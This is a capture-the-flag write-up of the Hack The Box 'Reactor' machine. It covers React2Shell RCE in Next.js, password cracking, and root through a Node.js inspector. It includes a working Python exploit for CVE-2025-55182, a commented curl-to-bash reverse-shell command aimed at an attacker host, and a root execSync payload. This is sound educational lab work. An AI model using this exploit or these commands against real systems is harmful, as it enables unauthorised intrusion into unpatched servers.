# Reactor

> https://app.hackthebox.com/machines/Reactor

<img width="1006" height="362" alt="capa" src="https://github.com/user-attachments/assets/de282cad-8ed6-4de6-81a5-a1efff16d3f0" />

## Table of Contents

- [About](#about)
- [References](#references)
- [Reconnaissance](#reconnaissance)
- [React2Shell](#react2shell)
- [SSH Access](#ssh-access)
- [Privilege Escalation](#privilege-escalation)
- [Conclusion](#conclusion)

## About

Reactor was an Easy Linux machine running a Next.js web application monitoring a fictional nuclear reactor. The challenge revolves around exploiting React2Shell (CVE-2025-55182), a critical unauthenticated RCE vulnerability in React Server Components, to gain initial access as the `node` user.

A SQLite database found in the application directory contained a password hash for the `engineer` user, which was cracked and reused for SSH access. Privilege escalation was achieved by exploiting a Node.js debugger instance running as root with the `--inspect` flag, allowing arbitrary JavaScript execution through a WebSocket debug console.

## References

- [NodeJS - Debugging](https://nodejs.org/learn/getting-started/debugging)
- [Github - React2Shell PoC](https://github.com/lachlan2k/React2Shell-CVE-2025-55182-original-poc)
- [TrendMicro - React2Shell](https://www.trendmicro.com/en_us/research/25/l/CVE-2025-55182-analysis-poc-itw.html)
- [React - Server Components](https://react.dev/reference/rsc/server-components)
- [Ably - WebSockets Explained](https://ably.com/topic/websockets)

## Reconnaissance

Nmap port scanning revealed 2 open TCP ports: __22__ (OpenSSH 9.6p1 Ubuntu) and __3000__ (Next.js __15.0.3__, confirmed via Wappalyzer).

<img width="1900" height="602" alt="0" src="https://github.com/user-attachments/assets/8d645bfb-2b34-44c9-91f2-6fe0ccd5d6ca" />


Going to the website on _port 3000_, we can see a core systems monitor dashboard for a nuclear reactor, displaying metrics such as _Temperature, Pressure, Coolant Flow, and Turbine Output_. The dashboard also displayed _system logs_ and a list of _on-site personnel_.

<img width="1920" height="898" alt="1" src="https://github.com/user-attachments/assets/a92bbe23-3174-4daf-8333-ed74cb469c99" />


## React2Shell
As stated previously, the version in use for this NextJS website is `15.0.3` which is susceptible to [React2Shell](https://www.trendmicro.com/en_us/research/25/l/CVE-2025-55182-analysis-poc-itw.html), an infamous _CVSS 10.0_ that was disclosed in December 2025.

RCE can be achieved by sending a single crafted _POST_ request that exploits unsafe deserialization in the React Server Components (RSC) _Flight_ protocol. When the server processes the request, the attacker-controlled serialized payload is passed to the backend and deserialized without validation, allowing arbitrary JavaScript to execute under the __Node.js runtime__.

We can use a simple [Python Script](tools/react2shell-poc.py) to trigger the _RCE_ and gain initial access as `node`.

```python
import sys, json, requests

PROXIES = {'http': 'http://localhost:8080'} # BURP proxy for inspection
BASE_URL = sys.argv[1] # http://reactor.htb:3000
COMMAND = sys.argv[2] # "curl http://<attacker>:<port>/shell.sh | bash"

chunk = {
    "then": "$1:__proto__:then",
    "status": "resolved_model",
    "reason": -1,
    "value": '{"then": "$B0"}',
    "_response": {
        "_prefix": f"var res = process.mainModule.require('child_process').execSync('{COMMAND}',{{'timeout':5000}}).toString().trim(); throw Object.assign(new Error('NEXT_REDIRECT'), {{digest:`${{res}}`}});",
        "_formData": {
            "get": "$1:constructor:constructor",
        },
    },
}

files = {
    "0": (None, json.dumps(chunk)),
    "1": (None, '"$@0"'),
}

headers = {"Next-Action": "x"}

response = requests.post(BASE_URL, files=files, headers=headers, timeout=10, proxies=PROXIES)
print(response.text)
```

<img width="1901" height="481" alt="2" src="https://github.com/user-attachments/assets/c080d8f4-0e24-44a1-93b8-851f9e44b057" />


After gaining a shell, I was dropped in the `/opt/reactor-app` directory (the website being served on port 3000). Inside there were two interesting files: `.env` and `reactor.db`.

<img width="1230" height="368" alt="3" src="https://github.com/user-attachments/assets/2de3f443-83e4-4cc0-878d-4ce768eda5c7" />


## SSH Access

Reading `/etc/passwd` showed two accounts with interactive login shells: `root` and `engineer`. Dumping the _SQLite_ database revealed the password hash for the user `engineer`. Cracking it with _rockyou.txt_ revealed the password to be `reactor1`.

<img width="1901" height="499" alt="4" src="https://github.com/user-attachments/assets/bf26f88a-d77d-458e-8ddc-129010e600ec" />
<img width="1041" height="144" alt="5" src="https://github.com/user-attachments/assets/15797790-aa2d-44e5-8461-32af27f4e242" />


With those credentials, I was able to access the machine via _SSH_ due to password reuse.

<img width="1808" height="723" alt="6" src="https://github.com/user-attachments/assets/e811c756-4eb0-4531-b851-312c15fa17d6" />


## Privilege Escalation

Inspecting running processes, I could see that there was a _node_ instance running as _root_:  `/usr/bin/node --inspect=127.0.0.1:9229 /opt/uptime-monitor/worker.js`.

<img width="1912" height="381" alt="7" src="https://github.com/user-attachments/assets/4c222bb0-cbee-41a8-8588-0490fc3fc3c1" />


#### /etc/systemd/system/uptime-monitor.service
```
[Unit]
Description=Internal uptime/latency monitor for the SSR app
After=network.target

[Service]
Type=simple     
User=root
ExecStart=/usr/bin/node --inspect=127.0.0.1:9229 /opt/uptime-monitor/worker.js
Restart=on-failure
RestartSec=3
StandardOutput=journal
StandardError=journal

[Install]                              
WantedBy=multi-user.target
```

`--inspect=127.0.0.1:9229` means the Node.js debugger is listening on localhost, which exposes a WebSocket endpoint that allowed arbitrary JavaScript execution in the root process. Knowing this, I connected to the debug session using `node inspect 127.0.0.1:9229`.

Once inside the _REPL (Read-Eval-Print Loop)_, arbitrary commands can be executed in the context of the root process with:

```js
exec("process.mainModule.require('child_process').execSync('<PAYLOAD>')")
```

I used this to spawn a root shell, completing the challenge  for this box.

<img width="1902" height="626" alt="8" src="https://github.com/user-attachments/assets/199742b1-80dd-42d5-b9d7-6e14d7b5c780" />


## Conclusion

The Reactor machine demonstrated a straightforward but technically interesting attack chain centered around a high-profile real-world vulnerability. The key lessons learned from this machine included:

- **React2Shell required no authentication to exploit** - CVE-2025-55182 in Next.js 15.0.3 allowed unauthenticated RCE through a single crafted POST request abusing unsafe deserialization in the RSC Flight protocol, requiring no custom application logic to trigger

- **Weak password hashing in an exposed database enabled lateral movement** - The SQLite database stored in the application directory contained a crackable hash, highlighting the risk of keeping databases alongside application code in readable directories

- **Node.js inspector exposed as a privilege escalation vector** - Running a Node.js process as root with the `--inspect` flag bound to localhost, even without direct external exposure, provided a reliable path to root once SSH access was obtained
